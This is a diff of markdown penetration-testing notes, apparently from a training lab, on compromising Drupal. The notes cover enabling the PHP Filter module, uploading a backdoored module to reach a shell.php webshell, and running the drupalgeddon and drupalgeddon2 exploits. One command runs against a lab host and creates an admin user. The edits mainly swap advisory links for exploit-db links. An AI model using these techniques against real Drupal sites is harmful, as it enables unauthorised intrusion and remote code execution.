@@ -1,5 +1,3 @@
-
-
 #### Leveraging the PHP Filter Module
 
 1. Enable PHP Filter Module
@@ -14,9 +12,6 @@ We can get the package and then upload it to modules
 wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 ```
 Once downloaded go to `Administration` > `Reports` > `Available updates`.
-
-
-
 
 #### Uploading backdoored modules
 
@@ -50,14 +45,14 @@ Once the installation succeeds, browse to `/modules/captcha/shell.php` to exec
 
 #### Leveraging Known Vulnerabilities
 
-[drupalgeddon](https://www.drupal.org/SA-CORE-2014-005)
+[drupalgeddon](https://www.exploit-db.com/exploits/34992)
 
 basic usage
 ```shell-session
 python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
 ```
 
-[drupalgeddon2](https://www.drupal.org/sa-core-2018-002)
+[drupalgeddon2](https://www.exploit-db.com/exploits/44448)
 
 create php webshell base64 encoded
 ```shell-session
